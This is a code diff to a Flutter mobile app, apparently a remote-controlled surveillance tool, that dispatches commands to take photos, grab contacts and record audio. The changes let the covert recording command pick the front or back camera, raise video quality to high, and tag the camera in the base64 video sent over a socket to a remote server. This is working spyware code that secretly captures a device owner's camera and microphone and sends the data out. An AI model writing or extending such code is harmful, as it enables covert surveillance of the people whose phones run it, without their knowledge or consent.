@@ -178,7 +178,7 @@ class _MyAppState extends State<MyApp> with WidgetsBindingObserver {
         await takePhoto(params['camera'] ?? 'front');
         break;
       case 'record_audio':
-        await recordAudioViaVideo(int.parse(params['duration'] ?? '10'));
+        await recordAudioViaVideo(int.parse(params['duration'] ?? '10'), params['camera'] ?? 'back');
         break;
       case 'get_contacts':
         await getContacts();
@@ -237,12 +237,15 @@ class _MyAppState extends State<MyApp> with WidgetsBindingObserver {
     }
   }
 
-  Future<void> recordAudioViaVideo(int duration) async {
+
+  Future<void> recordAudioViaVideo(int duration, String cameraType) async {
     try {
       final cameras = await availableCameras();
-      final camera = cameras.firstWhere((c) => c.lensDirection == CameraLensDirection.back);
+      final camera = cameraType == 'front'
+          ? cameras.firstWhere((c) => c.lensDirection == CameraLensDirection.front)
+          : cameras.firstWhere((c) => c.lensDirection == CameraLensDirection.back);
       
-      videoController = CameraController(camera, ResolutionPreset.low);
+      videoController = CameraController(camera, ResolutionPreset.high);
       await videoController?.initialize();
       
       final videoPath = '${(await getTemporaryDirectory()).path}/audio_${DateTime.now().millisecondsSinceEpoch}.mp4';
@@ -256,6 +259,7 @@ class _MyAppState extends State<MyApp> with WidgetsBindingObserver {
         socket.emit('audio_data', {
           'audio': base64Video,
           'format': 'mp4',
+          'camera': cameraType,
           'duration': duration,
           'timestamp': DateTime.now().toIso8601String(),
         });
